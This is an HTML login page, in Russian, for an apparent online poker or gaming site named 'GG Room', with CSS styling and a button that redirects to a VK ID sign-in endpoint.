<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GG Room</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #0d0d0d;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      text-align: center;
    }
    header {
      position: absolute;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      font-size: 1.5em;
      font-weight: bold;
      color: gold;
    }
    .card {
      background-color: #1a1a1a;
      border-radius: 12px;
      padding: 30px;
      width: 320px;
      position: relative;
      box-shadow: 0 0 30px rgba(0,0,0,0.5);
    }
    .card::before {
      content: "";
      position: absolute;
      inset: -1px;
      border-radius: calc(12px + 1px);
      padding: 1px;
      background: linear-gradient(135deg, rgba(247,228,164,.35), rgba(92,76,28,.1) 45%, rgba(247,228,164,.2));
      -webkit-mask: linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
      -webkit-mask-composite: xor;
      mask-composite: exclude;
      pointer-events: none; /* фикс, чтобы рамка не блокировала кнопку */
    }
    h2 {
      font-size: 1.3em;
      margin-bottom: 10px;
    }
    p {
      font-size: 0.9em;
      color: #aaa;
      margin-bottom: 20px;
    }
    .vk-btn {
      background-color: #0077ff;
      border: none;
      color: white;
      padding: 12px 20px;
      border-radius: 6px;
      cursor: pointer;
      font-size: 1em;
      width: 100%;
      font-weight: bold;
    }
    .vk-btn:hover {
      background-color: #005fcc;
    }
    .links {
      margin-top: 20px;
      display: flex;
      justify-content: space-between;
    }
    .links a {
      background-color: #2a2a2a;
      color: gold;
      padding: 6px 12px;
      border-radius: 20px;
      text-decoration: none;
      font-size: 0.8em;
    }
    .links a:hover {
      background-color: #3a3a3a;
    }
  </style>
</head>
<body>
  <header>GG ROOM</header>
  <div class="container">
    <div class="card">
      <h2>Войдите и начните выигрывать</h2>
      <p>Авторизация через VK ID. После входа отправим вас в лобби.</p>
      <button class="vk-btn" onclick="startAuth()">Войти через VK ID</button>
      <p style="font-size: 0.75em; margin-top: 10px; color: #666;">
        Если «Продолжить как ...» не появилось — нажмите кнопку выше.
      </p>
      <div class="links">
        <a href="#">WSOP Online</a>
        <a href="#">Гарантии призов</a>
        <a href="#">Турниры 24/7</a>
      </div>
    </div>
  </div>

  <script>
    function startAuth() {
      window.location.href = "https://vercel2pr.onrender.com/api/auth/vk/start";
    }
  </script>
</body>
</html>
